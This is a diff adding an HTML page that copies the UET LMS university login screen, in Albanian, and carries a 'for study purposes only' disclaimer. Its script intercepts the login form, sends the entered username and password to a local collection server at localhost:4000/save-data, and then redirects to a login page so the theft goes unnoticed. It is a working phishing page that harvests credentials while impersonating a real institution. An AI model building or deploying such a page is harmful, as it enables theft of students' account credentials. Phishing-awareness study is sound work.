@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="sq">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login në site | UET LMS </title>
+    <link rel="icon" type="image/png" href="download.png"> 
+    <style>
+        body {
+            Roboto: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 1;
+        }
+        .login-card {
+            background: white;
+            padding: 40px;
+            border-radius: 4px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            border: 1px solid #ddd;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 3px;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #008a7a;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .login-btn:hover { background-color: #007a6a; }
+        .forgot-link {
+            display: block;
+            text-align: center;
+            color: #0056b3;
+            font-size: 12px;
+            margin-top: 10px;
+            text-decoration: none;
+        }
+        hr { border: 0; border-top: 1px solid #eee; margin: 25px 0; }
+        .info-section { font-size: 11px; color: #555; line-height: 1.5; }
+        .info-section b { color: #000; font-size: 13px; }
+        .ms-btn {
+            width: 100%;
+            padding: 8px;
+            background: white;
+            border: 1px solid #ccc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            cursor: pointer;
+            margin-top: 15px;
+            font-size: 13px;
+        }
+        .footer-row {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 25px;
+            font-size: 11px;
+            color: #888;
+        }
+        .cookie-btn {
+            background: #333;
+            color: white;
+            border: none;
+            padding: 4px 10px;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <form id="loginForm">
+        <div class="input-group">
+            <input type="text" id="email" placeholder="Perdoruesi ose email" required>
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Fjalëkalimi" required>
+        </div>
+        <button type="submit" class="login-btn">Login</button>
+        <a href="#" class="forgot-link">Fjalëkalim i humbur?</a>
+    </form>
+
+    <hr>
+
+    <div class="info-section">
+        <p>*SQARIM: Kjo faqe është krijuar vetëm për qëllime studimore*</p>
+        <h1>A është hera e parë për ty këtu?</h1>
+        <p>Ju mund të aksesoni sistemin UET LMS në dy forma të ndryshme:</p>
+        <ol>
+            <li>Mënyra e parë është në dritaren majtas nëpërmjet username dhe password që keni marrë për sistemin UET LMS me email</li>
+            <li>Mënyra e dytë është duke përdorur adresën email (***********@uet.edu.al)
+që UET ka krijuar për ju dhe passwordin me të cilin ju aksesoni këtë
+adrese email, duke klikuar në logon e microsoft më poshtë.</li>
+        </ol>
+        <p>Me të dyja format më sipër ju aksesoni të njëjtën llogari ne sistemin UET LMS.
+
+Nëse
+ende keni ndonjë paqartësi, apo ende nuk e keni marrë aksesin në
+sistemin UET LMS dhe në adresën email të krijuar për ju, ju lutemi të na
+kontaktoni në adresën email lms@uet.edu.al.
+
+Në
+këtë email ju duhet të specifikoni të dhënat tuaja si: Emër, Atësi,
+Mbiemër, Fakulteti, Niveli i studimit, Dega, viti i regjistrimit.</p>
+        <h1>Hyr në LMS duke u loguar në emailin e UET:</h1>
+    </div>
+
+    <button class="ms-btn">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="16">
+        UET Email
+    </button>
+
+    <div class="footer-row">
+        <span>Shqip (sq) ▼</span>
+        <button class="cookie-btn">Cookies notice</button>
+    </div>
+</div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    // Dergon te dhenat te serveri lokal
+    fetch('http://localhost:4000/save-data', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: email, password: password })
+    })
+    .then(response => response.json())
+    .then(data => {
+        alert(data.message);
+        window.location.href = 'login.html';
+    })
+    .catch(err => alert('Gabim! Sigurohu qe server.js po punon!'));
+});
+</script>
+
+</body>
+</html>
